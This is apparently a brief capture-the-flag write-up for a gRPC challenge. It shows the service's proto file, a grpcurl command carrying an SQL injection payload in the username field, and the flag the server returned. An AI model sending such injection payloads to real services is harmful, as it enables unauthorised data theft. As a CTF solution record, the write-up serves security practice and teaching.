SQL injection in gRPC service.

user.proto
```
// user.proto
syntax = "proto3";

service UserService {
  rpc GetUser (UserRequest) returns (UserReply) {}
}

message UserRequest {
  string username = 1;
}

message UserReply {
  string data = 1;
}
```

```bash
grpcurl -plaintext -proto user.proto -d "{\"username\": \"' or key='secret_flag';-- -\"}" chal.78727867.xyz:14514 UserService/GetUser
{
  "data": "NHNC{lETs_cOoK_THe_GoOSE_:speaking_head::speaking_head::speaking_head:}"
}
```

NHNC{lETs_cOoK_THe_GoOSE_🗣️🗣️🗣️}

Solved by: benkyou